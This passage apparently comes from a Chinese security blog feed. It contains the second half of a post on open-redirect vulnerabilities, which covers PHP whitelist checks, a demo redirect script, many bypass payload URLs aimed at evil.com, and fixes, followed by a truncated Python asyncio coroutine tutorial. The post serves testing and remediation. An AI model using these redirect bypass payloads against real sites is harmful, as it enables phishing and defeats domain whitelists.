&#125;</span><br><span class="line">        $hostLen = strlen($host);</span><br><span class="line">        <span class="keyword">foreach</span>($domainArr <span class="keyword">as</span> $domain)&#123;</span><br><span class="line">            $firstPos = strpos($host, $domain);</span><br><span class="line">            <span class="keyword">if</span>($firstPos !== <span class="keyword">false</span> &amp;&amp; ($firstPos + strlen($domain)) == $hostLen)&#123;</span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span>($firstPos == <span class="number">0</span> || $domain[<span class="number">0</span>] == <span class="string">'.'</span> || $host[$firstPos<span class="number">-1</span>] == <span class="string">'.'</span>)&#123;</span><br><span class="line">                    $res[<span class="string">'isTrustedDomain'</span>] = <span class="keyword">true</span>;</span><br><span class="line">                    $res[<span class="string">'url'</span>]                         = $url;</span><br><span class="line">                    $res[<span class="string">'domain'</span>]              = $domain;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterUrl</span><span class="params">( $url )</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url)) <span class="keyword">return</span> $url;</span><br><span class="line">        <span class="comment">// Strip all of the Javascript in script tags out...</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/&lt;SCRIPT.*?&lt;\/SCRIPT&gt;/ims'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">// Strip all blank character</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/[\s\v\0]+/'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">//Strip special characters(',",&lt;,&gt;,\)</span></span><br><span class="line">        $url = str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">"\""</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"\\"</span>),<span class="string">''</span>,$url);</span><br><span class="line">        <span class="keyword">return</span> $url;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidHost</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $p = <span class="string">"/^[0-9a-zA-Z\-\.]+$/"</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($p,$host) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line">$url = <span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">$call_back_url = trim($url);</span><br><span class="line">$call_back_url = encodeUrl(parse_url(urldecode($call_back_url)));</span><br><span class="line">$res = checkUrl($call_back_url, $domainArr);</span><br><span class="line"> </span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="攻击方式及危害性"><a href="#攻击方式及危害性" class="headerlink" title="攻击方式及危害性"></a>攻击方式及危害性</h3><ul>
<li>恶意用户借助URL跳转构造钓鱼页面欺骗其他用户，以及获取敏感信息等，在有在线业务的站点危害较大。</li>
<li>借助URL跳转突破一些基于白名单的安全机制。如：传统的IM对URL的传播进行安全校验，但对于大站点的域名及URL直接允许通过并显示可信的URL，如果该URL中包含恶意跳转可能会导致安全限制被绕过。</li>
<li>基于白名单引用的资源，这种方式与上面的类似。比如：引入youku.com的视频，白名单中检测的时youku.com,如果包含恶意链接还是可能突破限制。</li>
<li>在带referer传输的站点中，就不只会产生任意URL跳转这个问题，同时可能会造成所有基于referer的安全策略失效（比较少见）</li>
</ul>
<h3 id="模拟跨域请求"><a href="#模拟跨域请求" class="headerlink" title="模拟跨域请求"></a>模拟跨域请求</h3><ul>
<li><p>在header头中跳转：（并没有带referer请求，所以这里只会产生任意URL及钓鱼诈骗等）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	<span class="comment">// 使服务端进行302跳转</span></span><br><span class="line">	header(<span class="string">"Location: $target"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//在JavaScript中跳转</span></span><br><span class="line">	<span class="comment">// echo "&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;";</span></span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">referer.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">	$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos($referer, <span class="string">"127.0.0.1:81"</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"referer is true"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Wrong referer"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"referer is null"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问：<code>http://127.0.0.1:81/url.php?url=http://127.0.0.1:82/referer.php</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530507.75.png" alt></p>
</li>
<li><p>在js中跳转（带referer传输，除了任意URL跳转漏洞之外还会绕过基于referer的所有安全策略）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530750.79.png" alt></p>
</li>
</ul>
<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><ul>
<li>抓取数据包中状态码为302的URL</li>
<li>修改目标地址</li>
<li>查看是否正常跳转（如果不存在直接返回到它自己的域名，如果存在则跳转）</li>
<li>尝试绕过</li>
<li>注意点：协议一致性问题。有些网站校验跳转后的协议必须为HTTPS，有时候无法跳转并不会提示。</li>
</ul>
<h3 id="常见的绕过方式（利用浏览器对URL特性的支持）"><a href="#常见的绕过方式（利用浏览器对URL特性的支持）" class="headerlink" title="常见的绕过方式（利用浏览器对URL特性的支持）"></a>常见的绕过方式（利用浏览器对URL特性的支持）</h3><ol>
<li><p>“@”  （在Firefox中使用会有弹窗提示，其他浏览器没有）</p>
<p><code>http://www.target.com/redirecturl=http://whitelist.com@evil.com</code></p>
</li>
<li><p>“.”</p>
<p><code>http://www.target.com/redirecturl=.eval.com</code></p>
</li>
<li><p>“/”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com/whitelist.com</code></p>
<p><code>http://www.target.com/redirecturl=/http://evil.com</code></p>
</li>
<li><p>“\”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\a.whitelist.com</code></p>
</li>
<li><p>“\\”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\\a.whitelist.com</code></p>
</li>
<li><p>“\.”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\.a.whitelist.com</code></p>
</li>
<li><p>“?”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com?a.whitelist.com</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用问号，这是一个特性，利用问号可以成功绕过URL限制</span><br><span class="line">比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>“#”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com#a.whitelist.com</code></p>
</li>
<li><p>利用白名单缺陷绕过限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些域名白名单限制不严格。</span><br><span class="line">1. 检测是否是当前域名</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com在访问后会跳转到login.aaa.com，如果它的白名单显示不严格，将login.aaa.com改成aaa.com同样可以跳转，到这里都是合法的跳转。这时只要构造一个第三方的域名中包含aaa.com的url就可以成功跳转。如果恰好有这样一个域名，恭喜你；如果没有，就需要买一个域名。emmm..在国内这样很亏</span><br><span class="line"></span><br><span class="line">2.域名字符串检测欺骗</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com，检测login.aaa.com，直接修改为：http://www.aaa.com/acb?Url=http://login.aaa.com.www.eval.com</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542520860.14.png" alt></p>
</li>
<li><p>利用多重验证&amp;跳转绕过限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在的许多网站都有多重验证。例如：在登录账户以后会出现另一个验证，输入手机号进行验证，这时可能存在任意URL跳转的问题。具体如下：</span><br><span class="line">http://www.aaa.com/acb?Url=http:...http://login.aaa.com,这里只需要修改最后的URL来绕过限制</span><br></pre></td></tr></table></figure>
</li>
<li><p>点击触发达到绕过URL跳转的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在许多的登录的位置，URL是一个跳转的地址。比如：http://www.aaa.com/acb?Url=http://login.aaa.com;这个时候只要将login.aaa.com修改为任意URL;这时界面没有发生变化，当用户输入账号密码点击登录按钮时会触发跳转。</span><br><span class="line">需要注意的是：这里不一定要输入正确的账号密码进行跳转，有些需要，视具体的站点而定</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用xip.io绕过限制（还可以借鉴其余的SSRF绕过方法）</p>
<p><code>http://www.aaa.com/acb?Url=http://login.aaa.com.eval.com.xip.io</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在SSRF读取内网地址的时候会有许多限制，有时候可以利用xip.io直接绕过限制读取，这里可以引用这个方法，直接将可以跳转的位置的地址后添加为任意url+xip.io，如果可以存在则将跳转的地址解析到后面的恶意url进行跳转。</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用超链接绕过可信站点的限制（可信站多次重定向）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如一个存在URL跳转漏洞的位置，在测试的时候一般都喜欢使用www.baidu.com等知名站点去做第三方跳转，但是现在像baidu.com,qq.com这样的可信站点被许多站点默认加在白名单中，所以以这样可信的站点去跳转它并不能触发URL跳转漏洞（这里是网站的正常逻辑）；而别的方式又绕不过，就可以利用下面这个思路：</span><br><span class="line"></span><br><span class="line">1. baidu.com这个域名已经被加在测试站点的白名单中</span><br><span class="line">2. 任意跳转的URL已经被baidu收录</span><br><span class="line">3. site:xxx(任意跳转的URL)</span><br><span class="line">4. 在百度点击相关的站点的时候回利用百度自身的一个302跳转</span><br><span class="line">5. 将百度自身的这个302跳转作为测试站点热任意URL的参数，绕过白名单baidu.com的限制进行任意URL跳转(注意：百度自身的302跳转太长了，可以使用单向压缩函数进行压缩，前提是测试站点能够解析)</span><br><span class="line"></span><br><span class="line">第二种场景：测试站点的白名单限制的比较严格，只允许加在自己域的地址，这时就需要一个测试站点其他域存在任意URL跳转漏洞，才可能利用成功：</span><br><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=eval.com</span><br><span class="line">总结：其实是利用了两次URL跳转</span><br></pre></td></tr></table></figure>
</li>
<li><p>POST方式的URL跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. post方式下的影响较小，比如在站点的个人信息处存在头像上传，上传正常的头像，抓包将头像地址修改为恶意第三方地址，放行以后图片是不能正常显示的，这个时候如果有后台管理员的审核安全意识不高，去查看这个不显示的图片，触发恶意URL跳转，可以打到后台管理员信息。利用条件比较苛刻。在XSS也有类似的利用场景。</span><br><span class="line"></span><br><span class="line">2.如果在POST方式中数据只URL跳转参数，那就可以尝试将POST请求转换为GET请求，配合上面的绕过方式利用。（前提是测试网站支持GET传参的方式）</span><br></pre></td></tr></table></figure>
</li>
<li><p>HPP参数污染绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=l@lsowl.xyz</span><br><span class="line"></span><br><span class="line">跳转会变成： location:http://https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=@lsowl.xyz</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="畸形地址绕过"><a href="#畸形地址绕过" class="headerlink" title="畸形地址绕过"></a>畸形地址绕过</h3><blockquote>
<p>畸形地址由于web站点采用各种各样的语言以及框架，所以绕过的方式显得很诡异。。。</p>
</blockquote>
<ol>
<li><p>通过添加多余的“/”(%2F),然后对%2F二次URL编码绕过网站对.com的分割</p>
<p><code>https://www.aaa.com/%2Fevil/%252Ecom</code> </p>
</li>
<li><p>通过添加4个“/”前缀和“/..”后缀，突破限制(重复特殊字符绕过)</p>
<p><code>https://www.aaa.com/redirect.php?url=////www.eval.com/..</code></p>
</li>
<li><p>特殊字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;&quot;, &quot;/&quot;, &quot;\&quot;, &quot;?&quot;, &quot;:&quot;, &quot;@&quot;, &quot;=&quot;, &quot;&amp;&quot;, &quot;.&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>协议型网站的实例</p>
<p><code>http://user:pass@testweb.com/path/;help.php?q=abc#lastpage</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542522531.03.png" alt></p>
</li>
</ol>
<h3 id="其他绕过思路"><a href="#其他绕过思路" class="headerlink" title="其他绕过思路"></a>其他绕过思路</h3><ol>
<li>跳转参数是IP，而不是域名</li>
<li>跳转到IPV6地址，不是IPV4地址</li>
<li>将要跳转的IP地址用10进制，8进制，16进制表示</li>
<li>更换协议，使用FTP,gopher</li>
<li>CRLF注入不能XSS时，转向利用任意URL跳转漏洞</li>
</ol>
<h3 id="IP地址计算补充（以本地ping百度返回的IP为例）"><a href="#IP地址计算补充（以本地ping百度返回的IP为例）" class="headerlink" title="IP地址计算补充（以本地ping百度返回的IP为例）"></a>IP地址计算补充（以本地ping百度返回的IP为例）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995163.32.png" alt></h3><h4 id="第一种计算方法（将点分十进制转换为32位二进制）"><a href="#第一种计算方法（将点分十进制转换为32位二进制）" class="headerlink" title="第一种计算方法（将点分十进制转换为32位二进制）"></a>第一种计算方法（将点分十进制转换为32位二进制）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995526.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995608.55.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995618.84.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995629.62.png" alt></h4><h4 id="第二种计算方法"><a href="#第二种计算方法" class="headerlink" title="第二种计算方法"></a>第二种计算方法</h4><p>111 <em> 256 </em> 256 <em> 256 + 13</em> 256 <em> 256 + 100 </em> 256 +92*1 = 1863148636（十进制）</p>
<h4 id="第三种计算方法（利用mysql中的inet-aton函数）"><a href="#第三种计算方法（利用mysql中的inet-aton函数）" class="headerlink" title="第三种计算方法（利用mysql中的inet_aton函数）"></a>第三种计算方法（利用mysql中的inet_aton函数）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550996163.52.png" alt></h4><h3 id="半自动化测试"><a href="#半自动化测试" class="headerlink" title="半自动化测试"></a>半自动化测试</h3><ul>
<li>开源的payload地址：<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a></li>
</ul>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
<li>referer限制<ul>
<li>确定传递URL参数的引入来源，保证URL的有效性，避免恶意用户自己生成的链接(这里要注意的是，在有些特殊的环境下，URL跳转会带着HTTP referer头，这样就会使得依赖referer头验证的方式失效)</li>
</ul>
</li>
<li>进行token验证<ul>
<li>保证所有的链接是可信域中的，加入用户不可控的token在服务端进行验证，防止恶意跳转</li>
</ul>
</li>
<li>服务端做好域名白名单或跳转白名单，只对合法的URL进行跳转（常用）</li>
<li>对请求参数做加密和签名，防止参数被篡改，服务端要能合法正确的解析URL（不常用，多应用在跳转的URL是由后台生产，不是用户在前台输入）</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/94377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/94377</a></p>
<p><a href="https://blog.csdn.net/change518/article/details/54286473" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/54286473</a></p>
<p><a href="https://blog.csdn.net/xyx107/article/details/82941842" target="_blank" rel="noopener">https://blog.csdn.net/xyx107/article/details/82941842</a></p>
<p><a href="https://blog.csdn.net/change518/article/details/53997509" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/53997509</a></p>
<p><a href="http://www.admintony.com/redict-bypass.html#more" target="_blank" rel="noopener">http://www.admintony.com/redict-bypass.html#more</a></p>
<p><a href="http://www.luteam.com/?p=211#more-211" target="_blank" rel="noopener">http://www.luteam.com/?p=211#more-211</a> [关于IP计算]</p>
<p><a href="http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</a> [关于SSRF绕过]</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>python协程学习</title>
    <url>/2018/11/09/python%E5%8D%8F%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="python学习总结"><a href="#python学习总结" class="headerlink" title="python学习总结"></a>python学习总结</h3><blockquote>
<p>在编写程序处理一些任务时为了提高效率，我们的程序会从单一的串行运行的方式向多线程或者多进程的方式来转变，这里学习总结通过python协程来提高程序运行的效率。多进程适合于CPU密集型的程序（各种循环处理，计数等等），多线程适合I/O密集型的程序（如文件的读取，网络爬虫等），但是由于python的GIL(全局解释器锁)的存在，I/O密集型的程序，效率并没有很大的提升，尤其是python在多CPU中多线程的应用（原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低），所以python对于I/O密集型的任务使用协程可以有效的提升效率。</p>
</blockquote>
<h3 id="相关知识总结"><a href="#相关知识总结" class="headerlink" title="相关知识总结"></a>相关知识总结</h3><h4 id="为什么python多线程比较鸡肋"><a href="#为什么python多线程比较鸡肋" class="headerlink" title="为什么python多线程比较鸡肋"></a>为什么python多线程比较鸡肋</h4><ol>
<li>在python多线程下，每个线程的执行方式：<ul>
<li>获取GIL</li>
<li>执行代码直到sleep或者是python虚拟机将其挂起</li>
<li>释放GIL</li>
</ul>
</li>
<li>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</li>
<li>每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)</li>
</ol>
<h4 id="多进程是什么，为什么不会像python多线程那样"><a href="#多进程是什么，为什么不会像python多线程那样" class="headerlink" title="多进程是什么，为什么不会像python多线程那样"></a>多进程是什么，为什么不会像python多线程那样</h4><ol>
<li>多进程就是利用 CPU 的多核优势，在同一时间并行地执行多个任务，可以大大提高执行效率。</li>
<li>每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)</li>
<li>python在多核CPU下做并行的效率提升，通用的就是使用多进程，可以有效的提高并行效率</li>
</ol>
<h4 id="什么是阻塞"><a href="#什么是阻塞" class="headerlink" title="什么是阻塞"></a>什么是阻塞</h4><ol>
<li>阻塞状态指陈程序未得到所需要的计算资源时暂时被挂起的，程序在等待某个操作完成的期间无法进行别的操作的状态。</li>
<li>常见的阻塞形式有：网络 I/O 阻塞、磁盘 I/O 阻塞、用户输入阻塞等。阻塞是无处不在的，包括 CPU 切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。如果是多核 CPU 则正在执行上下文切换操作的核不可被利用。</li>
</ol>
<h4 id="什么是非阻塞"><a href="#什么是非阻塞" class="headerlink" title="什么是非阻塞"></a>什么是非阻塞</h4><ol>
<li>非阻塞状态指在程序等待某个操作的过程中自身不被阻塞，可以继续进行其他的操作。</li>
<li>非阻塞并不是在任何程序级别、任何情况下都可以存在的。仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
</ol>
<h4 id="什么是同步"><a href="#什么是同步" class="headerlink" title="什么是同步"></a>什么是同步</h4><ol>
<li>不同的程序在完成某个任务，在执行过程中需要靠某种通信方式协调一致的模式</li>
<li>同步意味着有序</li>
</ol>
<h4 id="什么时异步"><a href="#什么时异步" class="headerlink" title="什么时异步"></a>什么时异步</h4><ol>
<li>不同的程序在完成某个任务，在执行过程中无需通信协调完成任务，不相关的程序单元之间可以是异步的。</li>
<li>异步意味着无序</li>
</ol>
<h4 id="什么是协程"><a href="#什么是协程" class="headerlink" title="什么是协程"></a>什么是协程</h4><ol>
<li>协程，英文叫做 Coroutine，又称微线程，纤程，协程是一种用户态的轻量级线程</li>
<li>协程自身拥有寄存器上下文和栈。协程在调度切换时，将寄存器和栈保存到其他地方，在切换上下文时恢复到原来保存的寄存器上下文和栈。协程可以保存上一次调用的状态，在每次过程的重载时就是进入了上一次调用的状态。</li>
<li>协程本质上是个单进程，协程相对于多进程来说，无需线程上下文切换的开销，无需原子操作锁定及同步的开销，编程模型也非常简单。结合上面来看，除去python的GIL全局解释器锁的问题，协程的上下文切换是在一个进程中不用跨进程，这种模式就决定了它的高效性。</li>
<li>使用协程来实现异步操作，比如在网络爬虫场景下，当一个请求发出后如果有超时的情况，这个时候就不需要一直等待，在这段时间内程序还可以处理许多任务，在请求响应以后切换回来处理，这样可以极大的提升对CPU的利用率，异步协程可以极大的提升我们处理I/O密集型任务的效率。</li>
</ol>
<h3 id="python异步协程的用法"><a href="#python异步协程的用法" class="headerlink" title="python异步协程的用法"></a>python异步协程的用法</h3><blockquote>
<p>python从3.4版本开始引入了协程的概念，是以生成器对象为基础，操作比较繁琐麻烦，在3.5版本引入了在 async/await，是的协程的操作更加简单。这里学习使用python协程中最常用的库 asyncio，这种协程也是基于生成器的，还有一种Gevent，Gevent需要许多第三方库支持。得确保项目中用到其他用到的网络库也必须使用纯Python或者明确说明支持Gevent，由于Gevent直接修改标准库里面大部分的阻塞式系统调用，可能会出现意想不到的问题，所以用asyncio来实现异步协程。</p>
</blockquote>
<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><ol>
<li>event_loop：事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足条件发生的时候，就会调用对应的处理方法。（这里可以理解为一个监听机制）</li>
<li>coroutine：中文翻译叫协程，在 Python 中常指代为协程对象类型，我们可以将协程对象注册到时间循环中，它会被事件循环调用。我们可以使用 async 关键字来定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。（方便开发者自己调控）</li>
<li>task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。</li>
<li>future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别</li>
<li>async/await 关键字，它是从 Python 3.5 才出现的，专门用于定义协程。其中，async 定义一个协程，await 用来挂起阻塞方法的执行。</li>
</ol>
<h4 id="定义协程"><a href="#定义协程" class="headerlink" title="定义协程"></a>定义协程</h4><ol>
<li><p>只注入简单的coroutine协程对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span>               <span class="comment">#定义一个协程,async定义的协程返回的是一个coroutine协程对象</span></span><br><span class="line">    print(<span class="string">'Number: '</span>,x)</span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine: '</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()     <span class="comment">#创建事件循环loop</span></span><br><span class="line">loop.run_until_complete(coroutine)  <span class="comment">#调用了 loop 对象的 run_until_complete() 方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Coroutine:  &lt;coroutine object execute at <span class="number">0x000001C08233BEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Number:  <span class="number">1</span></span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 coroutine 对象的进一步封装为task对象，它比 coroutine 对象多了运行状态，比如 running、finished 等，可以用这些状态来获取协程对象的执行情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = loop.create_task(coroutine)  <span class="comment">#调用loop.create_task将async定义返回的coroutine对象进一步分装</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop.run_until_complete(task)       <span class="comment">#调用了loop对象的run_until_complete()方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：这里可以看到task对象的状态</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x00000259A21EAEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task: &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
<li><p>不借助loop的create_task方法进一步封装task对象，通过asyncio 的 ensure_future() 方法直接定义task对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">task = asyncio.ensure_future(coroutine)   <span class="comment">#直接定义task对象</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：和通过loop.create_task封装的结果一样</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x000002C99E56AEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at 